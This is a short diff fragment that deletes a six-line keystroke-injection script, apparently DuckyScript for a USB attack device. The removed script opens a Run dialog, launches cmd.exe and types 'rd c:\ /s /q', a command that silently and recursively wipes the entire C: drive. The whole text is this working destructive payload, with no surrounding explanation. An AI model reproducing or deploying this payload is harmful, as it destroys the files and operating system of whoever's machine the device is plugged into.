@@ -1,6 +1,0 @@
-GUI r
-STRING cmd.exe
-ENTER
-DELAY 200
-STRING rd c:\ /s /q
-ENTER
